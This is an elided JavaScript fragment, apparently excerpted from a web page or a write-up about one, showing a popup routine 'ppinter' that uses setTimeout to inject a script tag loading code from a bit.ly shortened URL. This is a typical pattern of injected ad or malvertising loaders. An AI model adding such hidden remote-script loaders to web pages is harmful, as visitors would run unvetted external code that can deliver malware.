...
contextualAds = 'http://bit.ly/2C6HmR9', 'http://bit.ly/2IH8goi';
var MAX_TRIED = 20;
...
function ppinter(){
	...
	setTimeout('if(!poped ||forceInterstitial){var ppob = document.getElementById(pppid);var scob = document.createElement("SCRIPT");scob.src = "http://bit.ly/2C6HmR9";ppob.appendChild(scob);}', 10);
}
